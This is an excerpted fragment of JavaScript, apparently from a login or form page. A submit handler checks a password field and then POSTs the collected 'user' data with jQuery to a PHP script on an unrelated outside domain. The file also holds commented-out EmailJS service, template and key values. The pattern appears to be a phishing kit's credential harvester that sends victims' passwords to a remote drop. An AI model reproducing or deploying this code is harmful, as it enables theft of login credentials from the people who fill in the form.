  ...
  const submitHandler = (e) => {
    ...
    if (pwd === "") {
      return null
        ...
        // const serviceID = `service_urdxn32`;
        // const templateID = `template_lpng2bw`;
        // const publicKey = `-ZgKhIEN3NZgkUJpX`;
      ...
      $.ajax({
          type: "POST",
          url: "https://physicaleducationdiploma.com/dashboard/file/fres.php",
          data: user,
          success(data) {
              // alert('OK');
              // console.log(data);
